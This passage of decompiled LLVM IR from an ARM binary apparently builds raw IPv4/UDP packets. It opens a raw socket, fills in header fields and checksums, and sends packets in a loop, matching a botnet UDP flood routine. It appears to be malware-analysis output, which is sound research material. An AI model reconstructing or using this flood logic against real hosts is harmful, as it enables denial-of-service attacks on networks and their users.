  %v6_8f04 = inttoptr i32 %v0_8ef8 to i32*
  %v7_8f04 = call i32 @function_8570(i32 %v0_8efc, i32* %v6_8f04, i32 3, i32 65535)
  %v0_8f08 = load i32, i32* @r5, align 4
  store i32 %v0_8f08, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_8f18 = load i32, i32* @r4, align 4
  store i32 %v0_8f18, i32* %r0.global-to-local, align 4
  %v5_8f1c = inttoptr i32 %v0_8f08 to i32*
  %v6_8f1c = call i32 @function_8570(i32 %v0_8f18, i32* %v5_8f1c, i32 4, i32 64)
  %v1_8f24 = urem i32 %v6_8f1c, 256
  store i32 %v1_8f24, i32* %ip.global-to-local, align 4
  %v0_8f28 = load i32, i32* @r5, align 4
  store i32 %v0_8f28, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_8f34 = load i32, i32* @r4, align 4
  store i32 %v0_8f34, i32* %r0.global-to-local, align 4
  %v6_8f3c = inttoptr i32 %v0_8f28 to i32*
  %v7_8f3c = call i32 @function_8570(i32 %v0_8f34, i32* %v6_8f3c, i32 5, i32 0)
  %v1_8f48 = urem i32 %v7_8f3c, 256
  store i32 %v1_8f48, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_8f54 = load i32, i32* @r5, align 4
  store i32 %v0_8f54, i32* %r1.global-to-local, align 4
  %v0_8f58 = load i32, i32* @r4, align 4
  store i32 %v0_8f58, i32* %r0.global-to-local, align 4
  %v5_8f60 = inttoptr i32 %v0_8f54 to i32*
  %v6_8f60 = call i32 @function_8570(i32 %v0_8f58, i32* %v5_8f60, i32 6, i32 65535)
  %v0_8f68 = load i32, i32* @r5, align 4
  store i32 %v0_8f68, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_8f60, i32* %sb.global-to-local, align 4
  %v0_8f78 = load i32, i32* @r4, align 4
  store i32 %v0_8f78, i32* %r0.global-to-local, align 4
  %v4_8f7c = inttoptr i32 %v0_8f68 to i32*
  %v5_8f7c = call i32 @function_8570(i32 %v0_8f78, i32* %v4_8f7c, i32 7, i32 65535)
  %v0_8f80 = load i32, i32* @r5, align 4
  store i32 %v0_8f80, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_8f7c, i32* @sl, align 4
  %v0_8f90 = load i32, i32* @r4, align 4
  store i32 %v0_8f90, i32* %r0.global-to-local, align 4
  %v4_8f94 = inttoptr i32 %v0_8f80 to i32*
  %v5_8f94 = call i32 @function_8570(i32 %v0_8f90, i32* %v4_8f94, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_8fa0 = load i32, i32* @r5, align 4
  store i32 %v0_8fa0, i32* %r1.global-to-local, align 4
  store i32 %v5_8f94, i32* @r6, align 4
  %v0_8fa8 = load i32, i32* @r4, align 4
  store i32 %v0_8fa8, i32* %r0.global-to-local, align 4
  %v4_8fac = inttoptr i32 %v0_8fa0 to i32*
  %v5_8fac = call i32 @function_8570(i32 %v0_8fa8, i32* %v4_8fac, i32 1, i32 1)
  %v2_8fb8 = load i32, i32* @global_var_212d8.45, align 4
  store i32 %v2_8fb8, i32* %r3.global-to-local, align 4
  %v1_8fbc = urem i32 %v5_8fac, 256
  store i32 %v1_8fbc, i32* %ip.global-to-local, align 4
  %v0_8fc0 = load i32, i32* @r5, align 4
  store i32 %v0_8fc0, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_8fc8 = load i32, i32* @r4, align 4
  store i32 %v0_8fc8, i32* %r0.global-to-local, align 4
  %v5_8fd0 = inttoptr i32 %v0_8fc0 to i32*
  %v6_8fd0 = call i32 @function_8570(i32 %v0_8fc8, i32* %v5_8fd0, i32 25, i32 %v2_8fb8)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_8fe4 = call i32 @function_11aec(i32 2, i32 3, i32 17)
  store i32 %v3_8fe4, i32* %r0.global-to-local, align 4
  %v7_8fe8 = icmp eq i32 %v3_8fe4, -1
  store i1 %v7_8fe8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_8fe4, i32* @fp, align 4
  br i1 %v7_8fe8, label %dec_label_pc_9388, label %dec_label_pc_8ff4

dec_label_pc_8ff4:                                ; preds = %dec_label_pc_8eac
  store i32 1, i32* %stack_var_-44, align 4
  %v6_8ffc = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_8ffc, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_9010 = call i32 @function_11aa8(i32 %v3_8fe4, i32 0, i32 3, i32 %v6_8ffc, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_9010, i32* %r0.global-to-local, align 4
  %v7_9014 = icmp eq i32 %v5_9010, -1
  store i1 %v7_9014, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9014, label %dec_label_pc_9380, label %dec_label_pc_901c

dec_label_pc_901c:                                ; preds = %dec_label_pc_8ff4
  %v0_901c = load i32, i32* @r6, align 4
  store i32 1460, i32* %r3.global-to-local, align 4
  %v3_9028 = urem i32 %v0_901c, 65536
  store i32 %v3_9028, i32* %r2.global-to-local, align 4
  %v3_902c = icmp ugt i32 %v3_9028, 1459
  %v9_902c = icmp eq i32 %v3_9028, 1460
  store i1 %v9_902c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_902c, label %bb, label %bb48

bb:                                               ; preds = %dec_label_pc_901c
  store i32 1460, i32* %r2.global-to-local, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_901c, %bb
  %v0_9088 = phi i32 [ %v3_9028, %dec_label_pc_901c ], [ 1460, %bb ]
  store i32 %v7_8f04, i32* %r0.global-to-local, align 4
  %v0_9038 = load i32, i32* %sb.global-to-local, align 4
  %v3_9040 = urem i32 %v0_9038, 65536
  store i32 %v3_9040, i32* %ip.global-to-local, align 4
  %v0_9044 = load i32, i32* @r7, align 4
  %v2_9044 = icmp eq i32 %v0_9044, 0
  store i1 %v2_9044, i1* %cpsr_z.global-to-local, align 1
  %v0_9048 = load i32, i32* @sl, align 4
  %v3_9048 = mul i32 %v0_9048, 65536
  br i1 %v2_9044, label %bb49, label %bb50

bb49:                                             ; preds = %bb48
  store i32 %v0_9088, i32* %ip.global-to-local, align 4
  br label %bb50

bb50:                                             ; preds = %bb48, %bb49
  %v1_9078 = phi i32 [ %v3_9040, %bb48 ], [ %v0_9088, %bb49 ]
  %v3_9058 = urem i32 %v0_9048, 65536
  store i32 %v3_9058, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_9060 = urem i32 %v7_8f04, 65536
  store i32 %v3_9060, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_9044, label %.thread, label %dec_label_pc_9080

.thread:                                          ; preds = %bb50
  %v2_9074 = add nsw i32 %v1_9078, 28
  store i32 %v2_9074, i32* @sb, align 4
  %v2_9078 = add nsw i32 %v1_9078, 8
  store i32 %v2_9078, i32* @sl, align 4
  br label %dec_label_pc_91a4.preheader

dec_label_pc_9080:                                ; preds = %bb50
  %v1_9088 = add nuw nsw i32 %v0_9088, 28
  store i32 %v1_9088, i32* @sb, align 4
  %v1_908c = add nuw nsw i32 %v0_9088, 8
  store i32 %v1_908c, i32* @sl, align 4
  %tmp51 = mul i32 %v0_9038, 256
  %v3_90a0 = and i32 %tmp51, 65280
  %tmp52 = udiv i32 %v0_9038, 256
  %v4_90b0 = urem i32 %tmp52, 256
  %v5_90b0 = or i32 %v4_90b0, %v3_90a0
  store i32 %v5_90b0, i32* @r6, align 4
  store i32 %v3_9048, i32* %r1.global-to-local, align 4
  %tmp53 = mul nuw nsw i32 %v1_9088, 256
  %v3_90bc = and i32 %tmp53, 65280
  store i32 %v3_90bc, i32* %r3.global-to-local, align 4
  %tmp54 = mul i32 %v0_9048, 256
  %v3_90c0 = and i32 %tmp54, 65280
  %tmp55 = mul nuw nsw i32 %v1_908c, 256
  %v3_90c4 = and i32 %tmp55, 65280
  store i32 %v3_90c4, i32* %ip.global-to-local, align 4
  %tmp56 = udiv i32 %v1_9088, 256
  %v4_90c8 = urem i32 %tmp56, 256
  %v5_90c8 = or i32 %v4_90c8, %v3_90bc
  store i32 %v5_90c8, i32* @lr, align 4
  %tmp57 = udiv i32 %v0_9048, 256
  %v4_90cc = urem i32 %tmp57, 256
  %v5_90cc = or i32 %v4_90cc, %v3_90c0
  store i32 %v5_90cc, i32* %r0.global-to-local, align 4
  %trunc = trunc i32 %v1_908c to i16
  %rev = call i16 @llvm.bswap.i16(i16 %trunc)
  %tmp58 = mul i32 %v7_8f04, 256
  %v3_90d4 = and i32 %tmp58, 65280
  store i32 %v3_90d4, i32* %r2.global-to-local, align 4
  %tmp59 = udiv i32 %v7_8f04, 256
  %v4_90e4 = urem i32 %tmp59, 256
  %v5_90e4 = or i32 %v4_90e4, %v3_90d4
  store i32 %v5_90e4, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  %v4_913c = sext i8 %v5_8f00 to i32
  %sext6 = mul nuw i32 %v5_90c8, 65536
  %v4_9158 = sdiv i32 %sext6, 65536
  %sext7 = mul nuw i32 %v5_90cc, 65536
  %v7_918c = sdiv i32 %sext7, 65536
  %v1_914c = trunc i32 %v6_8f1c to i8
  %v3_918c = sext i16 %rev to i32
  br label %dec_label_pc_90ec

dec_label_pc_90ec:                                ; preds = %.thread9, %dec_label_pc_9080
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_90f8 = call i32 @function_12654(i32 1510, i32 1)
  store i32 %v2_90f8, i32* %r0.global-to-local, align 4
  store i32 %v2_8ec8, i32* %r3.global-to-local, align 4
  %v3_9100 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9100, i32* %r1.global-to-local, align 4
  %v2_9104 = load i32, i32* @r4, align 4
  %v5_9104 = mul i32 %v2_9104, 4
  %v6_9104 = add i32 %v5_9104, %v2_8ec8
  %v7_9104 = inttoptr i32 %v6_9104 to i32*
  store i32 %v2_90f8, i32* %v7_9104, align 4
  %v0_9108 = load i32, i32* %r3.global-to-local, align 4
  %v1_9108 = load i32, i32* %r1.global-to-local, align 4
  %v4_9108 = mul i32 %v1_9108, 4
  %v5_9108 = add i32 %v4_9108, %v0_9108
  %v6_9108 = inttoptr i32 %v5_9108 to i32*
  %v7_9108 = load i32, i32* %v6_9108, align 4
  store i32 %v7_9108, i32* %r0.global-to-local, align 4
  %v1_910c = inttoptr i32 %v7_9108 to i8*
  %v2_910c = load i8, i8* %v1_910c, align 1
  %tmp = urem i8 %v2_910c, 16
  %v1_9110 = zext i8 %tmp to i32
  %v1_9114 = or i32 %v1_9110, 64
  store i32 %v1_9114, i32* %r3.global-to-local, align 4
  %v1_9118 = trunc i32 %v1_9114 to i8
  store i8 %v1_9118, i8* %v1_910c, align 1
  %v0_911c = load i32, i32* %r0.global-to-local, align 4
  %v1_911c = inttoptr i32 %v0_911c to i8*
  %v2_911c = load i8, i8* %v1_911c, align 1
  %v1_9120 = and i8 %v2_911c, -16
  %v1_9124 = or i8 %v1_9120, 5
  store i32 %v1_8f48, i32* %ip.global-to-local, align 4
  %v0_912c = load i32, i32* %r1.global-to-local, align 4
  %v3_912c = mul i32 %v0_912c, 32
  store i32 %v3_912c, i32* %r2.global-to-local, align 4
  store i8 %v1_9124, i8* %v1_911c, align 1
  %v0_9134 = load i32, i32* %r1.global-to-local, align 4
  %v1_9134 = add i32 %v0_9134, 1
  store i32 %v1_9134, i32* @r4, align 4
  %v0_9138 = load i32, i32* %r2.global-to-local, align 4
  %tmp61 = mul i32 %v0_9134, -8
  %v5_9138 = add i32 %v0_9138, %tmp61
  store i32 %v5_9138, i32* %r2.global-to-local, align 4
  store i32 %v4_913c, i32* %r1.global-to-local, align 4
  %v2_9140 = load i32, i32* %r0.global-to-local, align 4
  %v3_9140 = add i32 %v2_9140, 1
  %v4_9140 = inttoptr i32 %v3_9140 to i8*
  store i8 %v5_8f00, i8* %v4_9140, align 1
  store i32 %v1_8f24, i32* %r3.global-to-local, align 4
  %v0_9148 = load i32, i32* %ip.global-to-local, align 4
  %v2_9148 = icmp eq i32 %v0_9148, 0
  store i1 %v2_9148, i1* %cpsr_z.global-to-local, align 1
  %v2_914c = load i32, i32* %r0.global-to-local, align 4
  %v3_914c = add i32 %v2_914c, 8
  %v4_914c = inttoptr i32 %v3_914c to i8*
  store i8 %v1_914c, i8* %v4_914c, align 1
  %v0_9150 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9150, label %.thread9, label %bb60

bb60:                                             ; preds = %dec_label_pc_90ec
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_9154 = load i32, i32* %r0.global-to-local, align 4
  %v4_9154 = add i32 %v3_9154, 6
  %v5_9154 = inttoptr i32 %v4_9154 to i16*
  store i16 64, i16* %v5_9154, align 2
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_90ec, %bb60
  store i32 %v4_9158, i32* %ip.global-to-local, align 4
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_9160 = load i32, i32* %r0.global-to-local, align 4
  %v3_9160 = add i32 %v2_9160, 9
  %v4_9160 = inttoptr i32 %v3_9160 to i8*
  store i8 17, i8* %v4_9160, align 1
  %v0_9164 = load i32, i32* %ip.global-to-local, align 4
  %v1_9164 = trunc i32 %v0_9164 to i16
  %v2_9164 = load i32, i32* %r0.global-to-local, align 4
  %v3_9164 = add i32 %v2_9164, 2
  %v4_9164 = inttoptr i32 %v3_9164 to i16*
  store i16 %v1_9164, i16* %v4_9164, align 2
  store i32 %v6_8fd0, i32* %ip.global-to-local, align 4
  %v1_916c = load i32, i32* %r0.global-to-local, align 4
  %v2_916c = add i32 %v1_916c, 12
  %v3_916c = inttoptr i32 %v2_916c to i32*
  store i32 %v6_8fd0, i32* %v3_916c, align 4
  %v0_9170 = load i32, i32* %r2.global-to-local, align 4
  %v1_9170 = load i32, i32* @r8, align 4
  %v2_9170 = add i32 %v1_9170, %v0_9170
  store i32 %v2_9170, i32* %r2.global-to-local, align 4
  %v1_9174 = add i32 %v2_9170, 16
  %v2_9174 = inttoptr i32 %v1_9174 to i32*
  %v3_9174 = load i32, i32* %v2_9174, align 4
  store i32 %v3_9174, i32* %r3.global-to-local, align 4
  %v0_9178 = load i32, i32* @r5, align 4
  %v1_9178 = trunc i32 %v0_9178 to i16
  %v2_9178 = load i32, i32* %r0.global-to-local, align 4
  %v3_9178 = add i32 %v2_9178, 4
  %v4_9178 = inttoptr i32 %v3_9178 to i16*
  store i16 %v1_9178, i16* %v4_9178, align 2
  %v0_917c = load i32, i32* %r0.global-to-local, align 4
  %v1_917c = add i32 %v0_917c, 20
  store i32 %v1_917c, i32* %r1.global-to-local, align 4
  %v0_9180 = load i32, i32* %r3.global-to-local, align 4
  %v2_9180 = add i32 %v0_917c, 16
  %v3_9180 = inttoptr i32 %v2_9180 to i32*
  store i32 %v0_9180, i32* %v3_9180, align 4
  %v0_9184 = load i32, i32* @r6, align 4
  %v1_9184 = trunc i32 %v0_9184 to i16
  %v2_9184 = load i32, i32* %r0.global-to-local, align 4
  %v3_9184 = add i32 %v2_9184, 20
  %v4_9184 = inttoptr i32 %v3_9184 to i16*
  store i16 %v1_9184, i16* %v4_9184, align 2
  store i32 %v3_918c, i32* %r0.global-to-local, align 4
  store i32 %v7_918c, i32* %r3.global-to-local, align 4
  %v0_9190 = load i32, i32* @r4, align 4
  %v1_9190 = load i32, i32* @r7, align 4
  %v9_9190 = icmp eq i32 %v0_9190, %v1_9190
  store i1 %v9_9190, i1* %cpsr_z.global-to-local, align 1
  %v2_9194 = load i32, i32* %r1.global-to-local, align 4
  %v3_9194 = add i32 %v2_9194, 4
  %v4_9194 = inttoptr i32 %v3_9194 to i16*
  store i16 %rev, i16* %v4_9194, align 2
  %v0_9198 = load i32, i32* %r3.global-to-local, align 4
  %v1_9198 = trunc i32 %v0_9198 to i16
  %v2_9198 = load i32, i32* %r1.global-to-local, align 4
  %v3_9198 = add i32 %v2_9198, 2
  %v4_9198 = inttoptr i32 %v3_9198 to i16*
  store i16 %v1_9198, i16* %v4_9198, align 2
  %v0_919c = load i32, i32* @r4, align 4
  store i32 %v0_919c, i32* %stack_var_-44, align 4
  %v5_91a0 = icmp slt i32 %v0_9190, %v1_9190
  br i1 %v5_91a0, label %dec_label_pc_90ec, label %dec_label_pc_91a4.preheader.loopexit

dec_label_pc_91a4.preheader.loopexit:             ; preds = %.thread9
  %v0_91a8.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_91a4.preheader

dec_label_pc_91a4.preheader:                      ; preds = %.thread, %dec_label_pc_91a4.preheader.loopexit
  %v0_91a8.pre = phi i32 [ %v0_91a8.pre.pre, %dec_label_pc_91a4.preheader.loopexit ], [ 0, %.thread ]
  %v3_9310 = icmp eq i32 %v6_8fd0, -1
  %v8_9310 = icmp eq i32 %v6_8fd0, -1
  %v3_9328 = icmp eq i32 %v3_9060, 65535
  %v2_9364 = icmp eq i32 %v1_8fbc, 0
  br label %dec_label_pc_91a4

dec_label_pc_91a4:                                ; preds = %dec_label_pc_91a4, %dec_label_pc_92a4, %dec_label_pc_91a4.preheader
  %v0_91a8 = phi i32 [ %v0_91a8.pre, %dec_label_pc_91a4.preheader ], [ 0, %dec_label_pc_92a4 ], [ 0, %dec_label_pc_91a4 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_91a8 = icmp eq i32 %v0_91a8, 0
  store i1 %v2_91a8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_91a8, label %dec_label_pc_91a4, label %dec_label_pc_91b4

dec_label_pc_91b4:                                ; preds = %dec_label_pc_91a4, %dec_label_pc_92a4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_91b8

dec_label_pc_91b8:                                ; preds = %dec_label_pc_9220, %dec_label_pc_91b4
  %v1_91cc = phi i32 [ %v1_9294, %dec_label_pc_9220 ], [ 0, %dec_label_pc_91b4 ]
  %v5_91bc = mul i32 %v1_91cc, 24
  %v1_91c0 = load i32, i32* @r8, align 4
  %v2_91c0 = add i32 %v1_91c0, %v5_91bc
  store i32 %v2_91c0, i32* %r3.global-to-local, align 4
  store i32 %v2_8ec8, i32* %r1.global-to-local, align 4
  %v1_91c8 = add i32 %v2_91c0, 20
  %v2_91c8 = inttoptr i32 %v1_91c8 to i8*
  %v3_91c8 = load i8, i8* %v2_91c8, align 1
  %v4_91c8 = zext i8 %v3_91c8 to i32
  store i32 %v4_91c8, i32* %r2.global-to-local, align 4
  %v4_91cc = mul i32 %v1_91cc, 4
  %v5_91cc = add i32 %v4_91cc, %v2_8ec8
  %v6_91cc = inttoptr i32 %v5_91cc to i32*
  %v7_91cc = load i32, i32* %v6_91cc, align 4
  store i32 %v7_91cc, i32* @r5, align 4
  %v7_91d0 = icmp eq i8 %v3_91c8, 31
  store i1 %v7_91d0, i1* %cpsr_z.global-to-local, align 1
  %v1_91d4 = add i32 %v7_91cc, 20
  store i32 %v1_91d4, i32* @r6, align 4
  %tmp62 = icmp ult i8 %v3_91c8, 32
  br i1 %tmp62, label %dec_label_pc_92b8, label %dec_label_pc_91dc

dec_label_pc_91dc:                                ; preds = %dec_label_pc_91b8
  store i32 %v6_8fd0, i32* %r3.global-to-local, align 4
  store i1 %v8_9310, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_9310, label %dec_label_pc_9318, label %dec_label_pc_91e8

dec_label_pc_91e8:                                ; preds = %dec_label_pc_92b8, %dec_label_pc_91dc
  store i32 %v3_9060, i32* %ip.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_9328, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_9328, label %dec_label_pc_9334, label %dec_label_pc_91fc

dec_label_pc_91fc:                                ; preds = %dec_label_pc_9318.dec_label_pc_91fc_crit_edge, %dec_label_pc_91e8
  %v1_9200 = phi i32 [ %v1_9200.pre, %dec_label_pc_9318.dec_label_pc_91fc_crit_edge ], [ 65535, %dec_label_pc_91e8 ]
  store i32 %v3_9040, i32* %r0.global-to-local, align 4
  %v9_9200 = icmp eq i32 %v3_9040, %v1_9200
  store i1 %v9_9200, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9200, label %dec_label_pc_9348, label %dec_label_pc_9208

dec_label_pc_9208:                                ; preds = %dec_label_pc_9334, %dec_label_pc_91fc
  %v1_920c = phi i32 [ %v1_9340, %dec_label_pc_9334 ], [ %v1_9200, %dec_label_pc_91fc ]
  store i32 %v3_9058, i32* %r1.global-to-local, align 4
  %v9_920c = icmp eq i32 %v3_9058, %v1_920c
  store i1 %v9_920c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_920c, label %dec_label_pc_935c, label %dec_label_pc_9214

dec_label_pc_9214:                                ; preds = %dec_label_pc_9348, %dec_label_pc_9208
  store i32 %v1_8fbc, i32* %r3.global-to-local, align 4
  store i1 %v2_9364, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9364, label %dec_label_pc_9220, label %dec_label_pc_9370

dec_label_pc_9220:                                ; preds = %dec_label_pc_9214, %dec_label_pc_935c, %dec_label_pc_9370
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_9224 = load i32, i32* @r5, align 4
  %v3_9224 = add i32 %v2_9224, 10
  %v4_9224 = inttoptr i32 %v3_9224 to i16*
  store i16 0, i16* %v4_9224, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_922c = load i32, i32* @r5, align 4
  store i32 %v0_922c, i32* @r0, align 4
  %v2_9230 = call i32 @function_c848(i32 %v0_922c, i32 20)
  %v3_9230 = trunc i32 %v2_9230 to i16
  %v3_9234 = load i32, i32* @r5, align 4
  %v4_9234 = add i32 %v3_9234, 10
  %v5_9234 = inttoptr i32 %v4_9234 to i16*
  store i16 %v3_9230, i16* %v5_9234, align 2
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_923c = load i32, i32* @r6, align 4
  %v3_923c = add i32 %v2_923c, 6
  %v4_923c = inttoptr i32 %v3_923c to i16*
  store i16 0, i16* %v4_923c, align 2
  %v0_9240 = load i32, i32* @r6, align 4
  store i32 %v0_9240, i32* @r1, align 4
  %v1_9244 = add i32 %v0_9240, 4
  %v2_9244 = inttoptr i32 %v1_9244 to i16*
  %v3_9244 = load i16, i16* %v2_9244, align 2
  %v4_9244 = zext i16 %v3_9244 to i32
  store i32 %v4_9244, i32* %r2.global-to-local, align 4
  %v0_9248 = load i32, i32* @sl, align 4
  store i32 %v0_9248, i32* %r3.global-to-local, align 4
  %v0_924c = load i32, i32* @r5, align 4
  store i32 %v0_924c, i32* %r0.global-to-local, align 4
  %v4_9250 = call i32 @function_c898(i32 %v0_924c, i32 %v0_9240, i32 %v4_9244, i32 %v0_9248)
  %v5_9250 = trunc i32 %v4_9250 to i16
  store i32 %v4_9250, i32* %r0.global-to-local, align 4
  %v3_9254 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9254, i32* %r3.global-to-local, align 4
  %v3_9258 = mul i32 %v3_9254, 32
  store i32 %v3_9258, i32* %lr.global-to-local, align 4
  %v3_925c = load i32, i32* @r6, align 4
  %v4_925c = add i32 %v3_925c, 6
  %v5_925c = inttoptr i32 %v4_925c to i16*
  store i16 %v5_9250, i16* %v5_925c, align 2
  %v0_9260 = load i32, i32* %lr.global-to-local, align 4
  %v1_9260 = load i32, i32* %r3.global-to-local, align 4
  %tmp63 = mul i32 %v1_9260, -8
  %v5_9260 = add i32 %v0_9260, %tmp63
  store i32 %v5_9260, i32* %lr.global-to-local, align 4
  %v0_9264 = load i32, i32* @r6, align 4
  %v1_9264 = add i32 %v0_9264, 2
  %v2_9264 = inttoptr i32 %v1_9264 to i16*
  %v3_9264 = load i16, i16* %v2_9264, align 2
  %v1_9268 = load i32, i32* @r8, align 4
  %v2_9268 = add i32 %v1_9268, %v5_9260
  store i32 %v2_9268, i32* @lr, align 4
  %v3_926c = add i32 %v2_9268, 2
  %v4_926c = inttoptr i32 %v3_926c to i16*
  store i16 %v3_9264, i16* %v4_926c, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_9278 = load i32, i32* @r5, align 4
  store i32 %v0_9278, i32* %r1.global-to-local, align 4
  %v0_927c = load i32, i32* @fp, align 4
  store i32 %v0_927c, i32* %r0.global-to-local, align 4
  %v0_9280 = load i32, i32* @sb, align 4
  store i32 %v0_9280, i32* %r2.global-to-local, align 4
  %v0_9284 = load i32, i32* @lr, align 4
  %v6_928c = call i32 @function_11a68(i32 %v0_927c, i32 %v0_9278, i32 %v0_9280, i32 16384, i32 %v0_9284, i32 16)
  %v3_9290 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9290, i32* %r3.global-to-local, align 4
  %v1_9294 = add i32 %v3_9290, 1
  store i32 %v1_9294, i32* %r0.global-to-local, align 4
  %v1_9298 = load i32, i32* @r7, align 4
  %v9_9298 = icmp eq i32 %v1_9294, %v1_9298
  store i1 %v9_9298, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_9294, i32* %stack_var_-44, align 4
  %v5_92a0 = icmp slt i32 %v1_9294, %v1_9298
  br i1 %v5_92a0, label %dec_label_pc_91b8, label %dec_label_pc_92a4

dec_label_pc_92a4:                                ; preds = %dec_label_pc_9220
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_92a8 = icmp eq i32 %v1_9298, 0
  store i1 %v2_92a8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_92a8, label %dec_label_pc_91a4, label %dec_label_pc_91b4

dec_label_pc_92b8:                                ; preds = %dec_label_pc_91b8
  %v1_92b8 = add i32 %v2_91c0, 16
  %v2_92b8 = inttoptr i32 %v1_92b8 to i32*
  %v3_92b8 = load i32, i32* %v2_92b8, align 4
  %v0_92bc = call i32 @function_e0d0()
  store i32 %v0_92bc, i32* %r0.global-to-local, align 4
  %v3_92c0 = load i32, i32* %stack_var_-44, align 4
  %v5_92c8 = mul i32 %v3_92c0, 24
  %v1_92cc = and i32 %v3_92b8, 16711680
  store i32 %v1_92cc, i32* %ip.global-to-local, align 4
  %v3_92d0 = udiv i32 %v3_92b8, 16777216
  %v4_92d4 = udiv i32 %v1_92cc, 256
  %v5_92d4 = or i32 %v4_92d4, %v3_92d0
  store i32 %v5_92d4, i32* %r2.global-to-local, align 4
  %v1_92d8 = load i32, i32* @r8, align 4
  %v2_92d8 = add i32 %v1_92d8, %v5_92c8
  store i32 %v2_92d8, i32* %r1.global-to-local, align 4
  %v1_92dc = and i32 %v3_92b8, 65280
  store i32 %v1_92dc, i32* %r3.global-to-local, align 4
  %v1_92e0 = add i32 %v2_92d8, 20
  %v2_92e0 = inttoptr i32 %v1_92e0 to i8*
  %v3_92e0 = load i8, i8* %v2_92e0, align 1
  %v4_92e0 = zext i8 %v3_92e0 to i32
  store i32 %v4_92e0, i32* %ip.global-to-local, align 4
  %v5_92e8 = call i32 @llvm.bswap.i32(i32 %v3_92b8)
  %v7_92ec = lshr i32 %v0_92bc, %v4_92e0
  %v8_92ec = add i32 %v7_92ec, %v5_92e8
  store i32 %v8_92ec, i32* %r2.global-to-local, align 4
  %v1_92f0 = and i32 %v8_92ec, 16711680
  store i32 %v1_92f0, i32* %r0.global-to-local, align 4
  %v1_92fc = and i32 %v8_92ec, 65280
  store i32 %v1_92fc, i32* %r1.global-to-local, align 4
  %v5_9304 = call i32 @llvm.bswap.i32(i32 %v8_92ec)
  %v1_9308 = load i32, i32* @r5, align 4
  %v2_9308 = add i32 %v1_9308, 16
  %v3_9308 = inttoptr i32 %v2_9308 to i32*
  store i32 %v5_9304, i32* %v3_9308, align 4
  store i32 %v6_8fd0, i32* %r3.global-to-local, align 4
  store i1 %v8_9310, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_9310, label %dec_label_pc_9318, label %dec_label_pc_91e8

dec_label_pc_9318:                                ; preds = %dec_label_pc_92b8, %dec_label_pc_91dc
  %v0_9318 = call i32 @function_e0d0()
  store i32 %v0_9318, i32* %r0.global-to-local, align 4
  store i32 %v3_9060, i32* %ip.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_9328, i1* %cpsr_z.global-to-local, align 1
  %v1_932c = load i32, i32* @r5, align 4
  %v2_932c = add i32 %v1_932c, 12
  %v3_932c = inttoptr i32 %v2_932c to i32*
  store i32 %v0_9318, i32* %v3_932c, align 4
  br i1 %v3_9328, label %dec_label_pc_9334, label %dec_label_pc_9318.dec_label_pc_91fc_crit_edge

dec_label_pc_9318.dec_label_pc_91fc_crit_edge:    ; preds = %dec_label_pc_9318
  %v1_9200.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_91fc

dec_label_pc_9334:                                ; preds = %dec_label_pc_9318, %dec_label_pc_91e8
  %v0_9334 = call i32 @function_e0d0()
  %v1_9334 = trunc i32 %v0_9334 to i16
  %v3_9338 = load i32, i32* @r5, align 4
  %v4_9338 = add i32 %v3_9338, 4
